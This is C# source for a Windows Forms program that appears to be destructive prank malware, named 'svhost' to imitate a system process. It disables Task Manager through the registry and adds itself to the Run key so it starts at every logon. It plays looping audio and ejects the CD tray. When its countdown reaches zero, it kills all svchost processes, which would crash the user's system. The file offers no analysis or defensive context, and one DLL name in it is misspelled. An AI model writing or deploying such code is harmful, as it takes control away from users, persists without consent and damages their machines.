using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace svhost
{
    public partial class okno : Form
    {
       
        public static string appName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        public static string appExe = Path.GetFileName(appName);
        int a = 1;
        int hpz = 99;
        [DllImport("winm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uRetrunLenght, int hwndCallback);

        public okno()
        {
            InitializeComponent();


            new Thread(() =>
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                if (key.GetValue("DisableTaskMgr") == null)
                    key.SetValue("DisableTaskMgr", "1");

            }).Start();
            new Thread(() =>
            {
                SoundPlayer player = new SoundPlayer(Properties.Resources.mus);
                player.PlayLooping();

            }).Start();
            new Thread(() =>
            {
                stau();


            }).Start();
            new Thread(() =>
            {
                
                stau();

            }).Start();
            shut(); 

             new Thread(() =>
             {
                 dvcd(); 



             }).Start();
        }
        
        private void TickOk(object sender, EventArgs e)
        {



            hpz -= 1;
            hpz.ToString();



            if (hpz < 0)
            {
                Process[] processes = Process.GetProcessesByName("svchost");
                foreach (var proc in processes)
                {
                    proc.Kill();
                }

            }

            int c = 99;
            if (c == 99)
            {
                Thread.Sleep(2000);
                hp.Text = hpz + "% ";
            }



            
            
                
            





        }

        private void Nam_Click(object sender, EventArgs e)
        {

        }

        private void hp_Click(object sender, EventArgs e)
        {

        }
        private void zpc()
        {
            

        }

        private void Timer2tick(object sender, EventArgs e)
        {

           
            
                



            
        }
        private void stau()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue(appExe,  appExe);
        }
        private void shut()
        {
            blood.Hide();
            if (hpz < 70)
            {
                blood.Show();
            }

        }
        private void pow()
        {

        }
        private void dvcd()
        {
            try
            {
                
                int result = mciSendString("set cdaudio door open", null, 0, 0);
                Thread.Sleep(5000);
                result = mciSendString("set cdaudio door close", null, 0, 0);
            }
            catch (Exception ex)
            { }
        }

        
        
    }

    }

